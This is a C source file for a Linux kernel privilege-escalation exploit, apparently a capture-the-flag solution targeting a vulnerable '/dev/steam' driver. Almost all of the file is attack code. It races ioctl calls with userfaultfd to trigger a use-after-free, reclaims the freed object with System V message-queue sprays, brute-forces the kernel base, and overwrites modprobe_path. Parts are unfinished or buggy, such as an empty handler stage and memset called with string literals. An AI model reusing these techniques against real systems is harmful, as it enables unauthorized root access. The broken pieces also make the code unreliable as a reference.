// from linux kernel 5.11, userfaultfd is disabled for userland => this exploit wont work
#define _GNU_SOURCE
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>
#include "utils.h"

#define DEVICE_PATH "/dev/steam"
#define PAGE_FAULT_ADDR 0xcafe000

#define MAX_ENGINES 0x100
#define MAX_COMPARTMENTS 0x200

#define NAME_SZ 0x28
#define DESC_SZ 0x70
#define LOG_SZ 0x100

#define ADD_ENGINE 0xc00010ff
#define ADD_COMPARTMENT 0x1337beef
#define DELETE_COMPARTMENT 0xdeadbeef
#define SHOW_ENGINE_LOG 0xcafebeef
#define UPDATE_ENGINE_LOG 0xbaadbeef

int steam_fd;
ulong kernel_base = 0xffffffff81000000, kernel_heap;
ulong user_cs, user_sp, user_ss, user_rflags;
pthread_t tid;
ulong userfault_page;
ulong modprobe_path=0xa231e0L;
uint stage = 0;
char engine_name[NAME_SZ], compartment_desc[DESC_SZ];
int engine_id;
uchar leak[0x100];

typedef struct 
{
    int id;
    uchar usage;
    char engine_name[NAME_SZ];
    char *logs;
} engine_t;

typedef struct
{
    int id;
    char compartment_desc[DESC_SZ];
    engine_t *engine;
} compartment_t;

typedef struct
{
    int id;
    char *name;
    char *desc;
    char *logs;
} request;

typedef struct 
{
    long mtype;
    char mtext[0x10000];
} msg;
msg msgbuf;

void save_state(void);
int initialize_ufd(void);
int userfaultfd(int);
void *page_fault_handler(void*);
int add_engine(char*);
int add_compartment(char*, int);
int del_compartment(int);
int show_log(int, char*);
int upd_log(int, char*);
int msg_alloc(int, char*, uint);

int main()
{
    steam_fd = open_dev(DEVICE_PATH);
    prepare_modprobe_path();
    
    // prepare an engine 
    memset(engine_name, "A", NAME_SZ);
    memset(compartment_desc, "B", DESC_SZ);
    // engines .bss: 0xffffffffc0003380
    // compartments .bss: 0xffffffffc0002380
    engine_id = add_engine(engine_name);
    int counter = 0;
    printf("[+] engine_id: 0x%lx\n", engine_id);
    int compartment_id; 
    // create 0xff-1 compartments => engine->usage == 0xfe
    for (int i=0;i<0xff-1;i++) {
        compartment_id = add_compartment(compartment_desc, engine_id);
        printf("[%d] compartment_id: 0x%lx\n", counter++, compartment_id);
    }

    getchar();
    int ufd = initialize_ufd();
    printf("[+] userfault fd: %d\n", ufd);
    pthread_create(&tid, NULL, page_fault_handler, &ufd);

    // calling add_compartment() to trigger userfault fd
    int target_compartment_id = add_compartment(PAGE_FAULT_ADDR, engine_id);
    printf("[*] target_compartment_id: 0x%lx\n", target_compartment_id); 

    // now target_compartment points to a freed object (kmalloc-64)
    int qid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
    char msg_payload[0x1000] = {0};
    memset(msg_payload, 0, 0x1000);
    
    getchar();
    puts("[+] brutefocring..."); 
    ulong *tmp = &msg_payload;

    int clgt = 0x00;
    // bruteforce kernel base
    int ret = -1;
    while (ret == -1) {
        printf("[*] Kernel_base attemp: 0x%lx\n", kernel_base);
        tmp[0] = kernel_base;
        tmp[1] = kernel_base;
        //memset(msg_payload, clgt++, 0x1000);

        msg_alloc(qid, msg_payload, 0x40);
        ret = show_engine_log(compartment_id, leak);
        kernel_base += 0x1000;
        //dump_output(msg_payload, 0x10);
        //printf("[*] ret: %d\n", ret);
        msg_free(qid, msg_payload, 0x40); 
        //getchar();
    }
    puts("out loop");
    kernel_base -= 0x1000;
    printf("[+] kernel_base: 0x%lx\n", kernel_base);
    modprobe_path += kernel_base;
    printf("[+] modprobe_path: 0x%lx\n", modprobe_path);

    tmp[0] = modprobe_path;
    msg_alloc(qid, msg_payload, 0x40);
    update_engine_log(target_compartment_id, "/home/ctf/dummy");
    // overwrite modprobe_path 
    getchar();
    trigger_modprobe_path();
}

void save_state(void)
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    printf("[*] Saved state\n");
}

int userfaultfd(int flags)
{
    return syscall(SYS_userfaultfd, flags);
}

int initialize_ufd(void)
{
    int fd;

    puts("[*] Mapping page with 0x4000 bytes");
    userfault_page = mmap((void *) PAGE_FAULT_ADDR, PAGE_SIZE*4, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANON|MAP_PRIVATE, -1, 0);

    if ((fd = userfaultfd(O_CLOEXEC|O_NONBLOCK)) == -1)
    {
        panic("[!] Error: Userfault failed!");
    }

    struct uffdio_api api = {
        .api = UFFD_API,
        .features = 0
    };

    if (ioctl(fd, UFFDIO_API, &api))
    {
        panic("[!] Error: ioctl - UFFDIO_API failed!");
    }

        if (api.api != UFFD_API) 
    {
        panic("[!] Error: Unexpected UFFD api version!");
    }

    struct uffdio_register req = {
        .mode = UFFDIO_REGISTER_MODE_MISSING,
        .range = {
            .start = (long) (userfault_page),
            .len = PAGE_SIZE*4,
        } 
    };

    if (ioctl(fd, UFFDIO_REGISTER, &req))
    {
        panic("[!] Error: ioctl - UFFDIO_REGISTER failed!");
    }
    
    return fd;
}

void *page_fault_handler(void *_ufd)
{
    struct pollfd pollfd;
    struct uffd_msg fault_msg;

    int ufd = *((int *) _ufd);

    pollfd.fd = ufd;
    pollfd.events = POLLIN;

    while (poll(&pollfd, 1, -1) > 0)
    {
        if ((pollfd.revents & POLLERR) || (pollfd.revents & POLLHUP))
        {
            panic("[!] Error: Polling failed!");
        }

        if (read(ufd ,&fault_msg, sizeof(fault_msg)) != sizeof(fault_msg)) 
        {
            panic("[!] Error: Read fault_msg failed!");
        }

        char *page_fault_location = (char *) fault_msg.arg.pagefault.address;

        if (fault_msg.event != UFFD_EVENT_PAGEFAULT || (page_fault_location != userfault_page))
        {
            panic("[!] Error: Unexpected pagefault!");
        }

        if (page_fault_location == (void *) 0xcafe000)
        {
            puts("Alright, we triggered our pagefault");
            printf("[*] Page fault at address %p!\n", page_fault_location);

            if (stage == 0) 
            {
                /*
                thread which calls add_compartment() is halting, in this thread just call another add_compartment() so that engine->usage reach max (0xff)
                */

                // calling add_compartment() 
                add_compartment(compartment_desc, engine_id);

            } 
            else if (stage == 1) 
            {
                /*
                this stage is tricky
                */
               
            }
            stage++;
        }

        // unblock userfaultfd
        struct uffdio_register uffdio_register;
        uffdio_register.range.start = fault_msg.arg.pagefault.address;
        uffdio_register.range.len = PAGE_SIZE*4;
        uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;

        ioctl(ufd, UFFDIO_UNREGISTER, &uffdio_register.range);
        return;
    }

    return;
}
int add_engine(char *name) 
{
    printf("[*] Calling add_engine(%p)\n", name);
    request req = {
        .id = 0,
        .name = name,
        .desc = NULL,
        .logs = NULL
    };
    int ret = ioctl(steam_fd, ADD_ENGINE, &req);
    assert(ret != -1);
    return ret;
}

int add_compartment(char *desc, int engine_id)
{
    printf("[*] Calling add_compartment(%p, 0x%lx)\n", desc, engine_id);
    request req = {
        .id = engine_id,
        .name = NULL,
        .desc = desc,
        .logs = NULL,
    };
    int ret = ioctl(steam_fd, ADD_COMPARTMENT, &req);
    assert(ret != -1);
    return ret;
}

int del_compartment(int compartment_id)
{
    printf("[*] Calling del_compartment(0x%lx)\n", compartment_id);
    request req = {
        .id = compartment_id,
        .name = NULL,
        .desc = NULL,
        .logs = NULL
    };
    int ret = ioctl(steam_fd, DELETE_COMPARTMENT, &req);
    assert(ret != -1);
    return ret;
}

int show_engine_log(int compartment_id, char *log)
{
    //printf("[*] Calling show_engine_log(0x%lx, %p)\n", compartment_id, log);
    request req = {
        .id = compartment_id,
        .name = NULL,
        .desc = NULL,
        .logs = log
    };
    int ret = ioctl(steam_fd, SHOW_ENGINE_LOG, &req);
    return ret;
}

int update_engine_log(int compartment_id, char *log)
{
    printf("[*] Calling update_engine_log(0x%lx, %p)\n", compartment_id, log);
    request req = {
        .id = compartment_id,
        .name = NULL,
        .desc = NULL,
        .logs = log
    };
    int ret = ioctl(steam_fd, UPDATE_ENGINE_LOG, &req);
    printf("test: 0x%lx\n", req.id);
    assert(ret != -1);
    return ret;
}

int msg_alloc(int qid, char *data, uint size)
{
    msgbuf.mtype = 1;
    //dump_output(msgbuf.mtext, 0x10);
    memcpy(msgbuf.mtext, data, size - 0x30);
    //dump_output(msgbuf.mtext, 0x10);
    return msgsnd(qid, &msgbuf, size - 0x30, 0);
}

int msg_free(int qid, char *data, uint size) 
{
    msgbuf.mtype = 1;

    return msgrcv(qid, &msgbuf, size-0x30, 1, 0);
}